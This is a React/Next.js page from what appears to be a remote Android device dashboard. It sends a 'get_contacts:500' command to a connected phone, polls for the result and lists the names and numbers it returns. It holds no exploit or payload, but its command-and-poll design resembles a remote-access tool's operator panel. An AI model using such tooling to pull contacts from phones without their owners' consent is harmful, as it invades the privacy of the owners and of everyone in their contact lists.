'use client'
import { Suspense } from 'react'
import { useEffect, useState } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import { Users, RefreshCw, Circle, Search, Download } from 'lucide-react'

interface Contact { name: string; number: string }

function parseContacts(text: string): Contact[] {
  const lines = text.split('\n').filter(l => l.trim() && !l.startsWith('===') && !l.startsWith('Total') && l.includes(':'))
  return lines.map(line => {
    const idx = line.lastIndexOf(':')
    if (idx < 0) return null
    return { name: line.slice(0, idx).trim(), number: line.slice(idx + 1).trim() }
  }).filter((c): c is Contact => !!c && c.name.length > 0)
}

async function smartPoll(
  deviceId: string,
  cmdPrefix: string,
  sentAt: number,
  maxAttempts = 20,
  intervalMs = 800
): Promise<string | null> {
  for (let i = 0; i < maxAttempts; i++) {
    await new Promise(r => setTimeout(r, i === 0 ? 1500 : intervalMs))
    const r = await fetch(`/api/device/result?deviceId=${deviceId}`)
    const d = await r.json()
    const match = (d.history ?? [])
      .filter((h: { command: string; result: string; timestamp: string }) =>
        h.command.startsWith(cmdPrefix) && new Date(h.timestamp).getTime() > sentAt - 500)
      .sort((a: { timestamp: string }, b: { timestamp: string }) =>
        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())[0]
    if (match?.result) return match.result as string
  }
  return null
}

function ContactsContent() {
  const { devices, selectedId, setSelectedId, connected } = useDevice()
  const [contacts, setContacts] = useState<Contact[]>([])
  const [filtered, setFiltered] = useState<Contact[]>([])
  const [search, setSearch] = useState('')
  const [loading, setLoading] = useState(false)

  useEffect(() => {
    const q = search.toLowerCase()
    setFiltered(q ? contacts.filter(c => c.name.toLowerCase().includes(q) || c.number.includes(q)) : contacts)
  }, [search, contacts])

  const fetchContacts = async () => {
    if (!selectedId) return
    setLoading(true)
    try {
      const sentAt = Date.now()
      await fetch('/api/device/command', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, command: 'get_contacts:500' }),
      })
      const result = await smartPoll(selectedId, 'get_contacts', sentAt)
      if (result) { const list = parseContacts(result); setContacts(list); setFiltered(list) }
    } finally { setLoading(false) }
  }

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-4xl mx-auto px-3 md:px-6 py-4 md:py-6">
          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="text-lg md:text-xl font-bold text-white flex items-center gap-2"><Users size={20} className="text-android-green" /> Contacts</h2>
              <p className="text-android-muted text-xs mt-0.5">View contacts from the connected device</p>
            </div>
            <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${connected ? 'text-android-green border-android-green/30 bg-android-green/10' : 'text-android-red border-android-red/30 bg-android-red/10'}`}>
              <Circle size={7} className={connected ? 'fill-android-green' : 'fill-android-red'} />{connected ? 'Online' : 'Offline'}
            </div>
          </div>

          <div className="flex gap-2 mb-4">
            {contacts.length > 0 && (
              <div className="flex-1 flex items-center gap-2 bg-android-surface border border-android-border rounded-lg px-3 py-2">
                <Search size={14} className="text-android-muted shrink-0" />
                <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search name or number…"
                  className="flex-1 bg-transparent text-android-text text-xs outline-none placeholder:text-android-muted/50" />
              </div>
            )}
            <button onClick={fetchContacts} disabled={!connected || loading}
              className="flex items-center gap-2 px-4 py-2 bg-android-green text-android-bg rounded-lg text-sm font-semibold disabled:opacity-40 disabled:cursor-not-allowed shrink-0">
              {loading ? <RefreshCw size={14} className="animate-spin" /> : <Download size={14} />}
              {loading ? 'Fetching…' : 'Fetch Contacts'}
            </button>
          </div>

          {!connected && <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl"><Users size={32} className="mx-auto mb-3 text-android-border" />Connect a device to view contacts</div>}

          {connected && contacts.length === 0 && !loading && (
            <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
              <Users size={32} className="mx-auto mb-3 text-android-border" /><p>Click &quot;Fetch Contacts&quot; to load the contacts list</p>
            </div>
          )}

          {filtered.length > 0 && (
            <div className="bg-android-surface border border-android-border rounded-xl overflow-hidden">
              <div className="px-4 py-2.5 border-b border-android-border text-xs text-android-muted">
                {filtered.length} {search ? 'results' : 'contacts'}
              </div>
              <div className="divide-y divide-android-border/50">
                {filtered.map((c, i) => (
                  <div key={i} className="flex items-center gap-3 px-4 py-3 hover:bg-white/5">
                    <div className="w-9 h-9 rounded-full bg-android-green/10 border border-android-green/20 flex items-center justify-center shrink-0">
                      <span className="text-android-green text-sm font-bold">{c.name[0]?.toUpperCase() ?? '?'}</span>
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-android-text text-sm font-semibold truncate">{c.name}</p>
                      <p className="text-android-muted text-xs font-mono">{c.number}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  )
}

export default function ContactsPage() {
  return (
    <Suspense fallback={<div className="flex min-h-screen items-center justify-center text-android-muted text-sm">Loading…</div>}>
      <ContactsContent />
    </Suspense>
  )
}
